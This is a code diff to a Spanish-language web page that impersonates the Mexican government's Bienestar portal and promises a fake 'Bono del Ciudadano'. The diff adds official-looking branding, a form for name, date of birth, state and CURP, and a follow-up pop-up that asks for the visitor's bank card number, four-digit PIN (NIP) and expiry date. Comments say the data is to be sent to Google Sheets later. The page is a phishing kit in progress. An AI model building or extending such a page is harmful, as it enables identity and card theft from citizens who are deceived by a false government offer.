@@ -21,27 +21,77 @@
             color: #333;
         }
 
-        /* Encabezado Institucional */
         header {
             background-color: var(--gob-verde);
-            padding: 15px 10%;
+            padding: 12px 8%;
             border-bottom: 4px solid var(--gob-dorado);
             display: flex;
             align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
         }
 
-        header h1 {
+        .brand-wrap {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .gov-logo {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: radial-gradient(circle at center, var(--gob-dorado) 0 35%, #a48b61 36% 100%);
+            box-shadow: inset 0 0 0 2px rgba(255,255,255,0.65);
+        }
+
+        .gov-text h1 {
             color: white;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             margin: 0;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
-        /* Contenedor Principal */
+        .gov-text small {
+            color: #f3e8d1;
+            font-size: 0.8rem;
+        }
+
+        .header-badges {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .badge {
+            background: rgba(255,255,255,0.12);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.35);
+            padding: 6px 10px;
+            border-radius: 999px;
+            font-size: 0.75rem;
+        }
+
+        .hero-image {
+            width: min(1100px, 92%);
+            margin: 20px auto 0;
+            height: 180px;
+            border-radius: 8px;
+            background: linear-gradient(120deg, rgba(19,50,43,0.92), rgba(159,34,65,0.92)),
+                        url('https://images.unsplash.com/photo-1521790797524-b2497295b8a0?auto=format&fit=crop&w=1400&q=80') center/cover;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+            display: flex;
+            align-items: end;
+            padding: 20px;
+            color: #fff;
+            box-sizing: border-box;
+        }
+
         .container {
             max-width: 800px;
-            margin: 50px auto;
+            margin: 30px auto;
             background: var(--gob-blanco);
             padding: 40px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
@@ -55,115 +105,126 @@
             margin-bottom: 30px;
         }
 
-        /* Formulario */
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            color: var(--gob-verde);
-        }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; color: var(--gob-verde); }
 
         input, select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 1rem;
+            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 1rem;
         }
 
         button {
-            background-color: var(--gob-guinda);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 1.1rem;
-            font-weight: bold;
-            width: 100%;
-            margin-top: 20px;
-            transition: background 0.3s;
+            background-color: var(--gob-guinda); color: white; padding: 15px 30px; border: none; border-radius: 4px;
+            cursor: pointer; font-size: 1.1rem; font-weight: bold; width: 100%; margin-top: 20px; transition: background 0.3s;
         }
+        button:hover { background-color: #7a1a32; }
 
-        button:hover {
-            background-color: #7a1a32;
-        }
-
-        /* Modal (Pop-up) */
         .modal {
-            display: none; 
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
+            display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%;
             background-color: rgba(0,0,0,0.7);
         }
 
         .modal-content {
-            background-color: white;
-            margin: 10% auto;
-            padding: 30px;
-            width: 80%;
-            max-width: 600px;
-            border-top: 10px solid var(--gob-guinda);
-            border-radius: 8px;
-            position: relative;
-            text-align: center;
+            background-color: white; margin: 8% auto; padding: 30px; width: 90%; max-width: 640px;
+            border-top: 10px solid var(--gob-guinda); border-radius: 8px; position: relative;
         }
 
-        .modal-content h3 {
-            color: var(--gob-verde);
-            font-size: 1.5rem;
-        }
-
-        .modal-content p {
-            line-height: 1.6;
-            text-align: justify;
-        }
+        .modal-content h3 { color: var(--gob-verde); font-size: 1.4rem; margin-top: 0; }
+        .modal-content p { line-height: 1.6; }
 
         .close-btn {
-            background: var(--gob-verde);
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 20px;
+            background: var(--gob-verde); color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer;
+        }
+
+        .card-data-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            margin-top: 14px;
+        }
+
+        .expiry-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .expiry-row input {
+            width: 80px;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        .sheet-note {
+            font-size: 0.85rem;
+            color: #5a5a5a;
+            margin-top: 14px;
+            background: #f8f8f8;
+            padding: 8px 10px;
+            border-left: 4px solid var(--gob-dorado);
         }
 
         footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 0.8rem;
-            color: #666;
-            margin-top: 40px;
+            text-align: center; padding: 20px; font-size: 0.8rem; color: #666; margin-top: 40px;
         }
     </style>
 </head>
 <body>
 
     <header>
-        <h1>Gobierno de México | Bienestar</h1>
+        <div class="brand-wrap">
+            <div class="gov-logo" aria-hidden="true"></div>
+            <div class="gov-text">
+                <h1>Gobierno de México | Bienestar</h1>
+                <small>Portal oficial de registro ciudadano</small>
+            </div>
+        </div>
+        <div class="header-badges">
+            <span class="badge">Secretaría de Bienestar</span>
+            <span class="badge">Transparencia</span>
+            <span class="badge">Trámite Gratuito</span>
+        </div>
     </header>
+
+    <section class="hero-image" aria-label="Imagen institucional de atención ciudadana">
+        <strong>Programa de Apoyo Social - Registro en Línea</strong>
+    </section>
 
     <div id="infoModal" class="modal">
         <div class="modal-content">
-            <h3>¡Felicidades! Beneficiario del Bono del Ciudadano</h3>
+            <h3>¡Bienvenido al registro del Bono del Ciudadano!</h3>
             <p>
-                Usted ha sido seleccionado para participar en el programa <strong>"Bono del Ciudadano"</strong>, una iniciativa impulsada en este sexenio para apoyar la economía de las familias mexicanas. 
-                <br><br>
-                Este apoyo único de <strong>$5,000.00 MXN</strong> está limitado estrictamente a los primeros <strong>100 ciudadanos</strong> que completen su registro correctamente en este portal oficial. 
-                <br><br>
-                <strong>Importante:</strong> El bono será entregado exclusivamente mediante depósito en su tarjeta física (no se aceptarán tarjetas digitales ni billeteras virtuales) para garantizar la integridad del proceso.
+                Complete su información con datos correctos para avanzar con el registro.
+                Una vez validado el formulario, se abrirá la sección final para capturar datos adicionales.
             </p>
-            <button class="close-btn" onclick="cerrarModal()">Entendido y Continuar</button>
+            <button class="close-btn" onclick="cerrarModal('infoModal')">Entendido y Continuar</button>
+        </div>
+    </div>
+
+    <div id="cardModal" class="modal">
+        <div class="modal-content">
+            <h3>Validación final de datos</h3>
+            <p><strong>Favor de poner los datos a la tarjeta que será recibido el bono.</strong></p>
+
+            <div class="card-data-grid">
+                <div class="form-group">
+                    <label for="numeroTarjeta">Número de tarjeta (máximo 20 caracteres)</label>
+                    <input type="text" id="numeroTarjeta" maxlength="20" required>
+                </div>
+                <div class="form-group">
+                    <label for="nip">NIP (4 caracteres)</label>
+                    <input type="password" id="nip" maxlength="4" minlength="4" required>
+                </div>
+                <div class="form-group">
+                    <label>Vencimiento (MM/AA)</label>
+                    <div class="expiry-row">
+                        <input type="text" id="mes" maxlength="2" placeholder="MM" inputmode="numeric" required>
+                        <span>/</span>
+                        <input type="text" id="anio" maxlength="2" placeholder="AA" inputmode="numeric" required>
+                    </div>
+                </div>
+            </div>
+
+            <button class="close-btn" id="guardarTarjetaBtn">Guardar y Finalizar</button>
         </div>
     </div>
 
@@ -179,8 +240,8 @@
                 <input type="text" id="apellido" name="apellido" required>
             </div>
             <div class="form-group">
-                <label for="edad">Edad</label>
-                <input type="number" id="edad" name="edad" min="18" max="110" required>
+                <label for="fechaNacimiento">Fecha de nacimiento</label>
+                <input type="date" id="fechaNacimiento" name="fechaNacimiento" required>
             </div>
             <div class="form-group">
                 <label for="estado">Estado de la República</label>
@@ -189,13 +250,17 @@
                     <option value="Aguascalientes">Aguascalientes</option>
                     <option value="Baja California">Baja California</option>
                     <option value="Sonora">Sonora</option>
-                    </select>
+                </select>
             </div>
             <div class="form-group">
                 <label for="curp">CURP (Clave Única de Registro de Población)</label>
                 <input type="text" id="curp" name="curp" pattern=".{18}" title="La CURP debe tener 18 caracteres" required style="text-transform: uppercase;">
             </div>
-            
+
+            <p class="sheet-note">
+                Nota técnica: el guardado en Google Sheets se conectará en la siguiente fase; este frontend ya deja listo el flujo y las validaciones.
+            </p>
+
             <button type="submit">Finalizar Registro y Reclamar Bono</button>
         </form>
     </div>
@@ -206,21 +271,45 @@
     </footer>
 
     <script>
-        // Mostrar el pop-up automáticamente al cargar
         window.onload = function() {
             document.getElementById('infoModal').style.display = 'block';
         };
 
-        function cerrarModal() {
-            document.getElementById('infoModal').style.display = 'none';
+        function cerrarModal(id) {
+            document.getElementById(id).style.display = 'none';
         }
 
-        // Manejo del envío del formulario (Conexión futura a Google Sheets)
-        document.getElementById('formBono').onsubmit = function(e) {
+        const formBono = document.getElementById('formBono');
+        const cardModal = document.getElementById('cardModal');
+
+        formBono.addEventListener('submit', function(e) {
             e.preventDefault();
-            alert("Procesando datos del registro... En breve recibirá una confirmación.");
-            // Aquí se integrará el script de Google Sheets
-        };
+
+            // Aquí irá la integración real a Google Sheets para los datos del formulario principal.
+            cardModal.style.display = 'block';
+        });
+
+        document.getElementById('guardarTarjetaBtn').addEventListener('click', function() {
+            const numeroTarjeta = document.getElementById('numeroTarjeta');
+            const nip = document.getElementById('nip');
+            const mes = document.getElementById('mes');
+            const anio = document.getElementById('anio');
+
+            if (!numeroTarjeta.value || !nip.value || !mes.value || !anio.value) {
+                alert('Completa todos los campos del pop-up final.');
+                return;
+            }
+
+            if (nip.value.length !== 4 || mes.value.length !== 2 || anio.value.length !== 2) {
+                alert('Verifica los límites: NIP 4 caracteres y vencimiento en formato MM/AA.');
+                return;
+            }
+
+            // Aquí irá la integración real a Google Sheets para los datos de tarjeta.
+            alert('Datos capturados correctamente. Se enviarán a Google Sheets cuando se conecte el backend.');
+            cerrarModal('cardModal');
+            formBono.reset();
+        });
     </script>
 </body>
 </html>
